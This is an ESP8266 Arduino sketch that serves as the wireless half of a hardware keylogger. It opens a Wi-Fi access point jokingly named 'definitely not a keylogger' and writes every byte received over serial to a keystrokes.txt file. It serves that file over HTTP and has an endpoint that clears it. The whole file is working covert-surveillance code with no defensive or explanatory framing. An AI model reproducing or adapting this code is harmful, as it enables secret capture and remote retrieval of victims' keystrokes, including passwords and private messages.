#include <ESP8266WiFi.h>
#include <FS.h>
#include <ESP8266mDNS.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFSEditor.h>
#include <EEPROM.h>

#define BAUD_RATE 115200

/* ============= CHANGE WIFI CREDENTIALS ============= */
const char *ssid = "definitely not a keylogger";
const char *password = "!keylogger"; //min 8 chars
/* ============= ======================= ============= */

AsyncWebServer server(80);
FSInfo fs_info;
File f;

void setup() {
  
  Serial.begin(BAUD_RATE);
  
  //Serial.println(WiFi.SSID());
  WiFi.mode(WIFI_STA);
  WiFi.softAP(ssid,password);
  
  EEPROM.begin(4096);
  SPIFFS.begin();
  
  MDNS.addService("http","tcp",80);

  f = SPIFFS.open("/keystrokes.txt", "a+");
  if(!f) Serial.println("file open failed");

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/keystrokes.txt", "text/plain");
  });

  server.on("/clear", HTTP_GET, [](AsyncWebServerRequest *request){
    f.close();
    f = SPIFFS.open("/keystrokes.txt", "w");
    request->send(200, "text/plain", "file cleared!");
  });
  
  server.begin();
}

void loop() {
  
  if(Serial.available()) {
    f.write(Serial.read());
  }
  
}

